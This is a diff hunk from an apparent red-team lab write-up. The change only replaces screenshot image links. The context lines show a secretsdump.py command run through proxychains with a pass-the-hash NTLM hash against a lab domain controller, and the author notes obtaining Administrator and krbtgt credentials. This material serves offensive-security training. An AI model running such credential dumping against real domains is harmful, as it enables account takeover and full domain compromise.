@@ -406,14 +406,13 @@ To look more information on my target domain controller, I will use the secretsd
 ```bash
 proxychains secretsdump.py child.redteam.corp/child-admin@10.10.10.2 -hashes :dbac2b57a73bb883422658d2aea36967
 ```
-
-![Screenshot 2023-07-08 at 8.23.21 PM.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/a21023a2-b284-4c78-b4e2-83caaace996a/Screenshot_2023-07-08_at_8.23.21_PM.png)
+![Screenshot 2023-07-08 at 8 23 21 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/0eff594b-d649-4bfe-a7d4-975ac5c58046)
 
 Great, I got the Administrator credential and other more machine part of this domain.
 
 Also I got the krbtgt credentials as well.
 
-![Screenshot 2023-07-08 at 8.28.08 PM.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/494a1532-bf87-4dc3-9fca-4321a47baaa8/Screenshot_2023-07-08_at_8.28.08_PM.png)
+![Screenshot 2023-07-08 at 8 28 08 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/1ba1af26-971f-4e81-941a-09c95a807650)
 
 ## secretsdump.py -debug
 
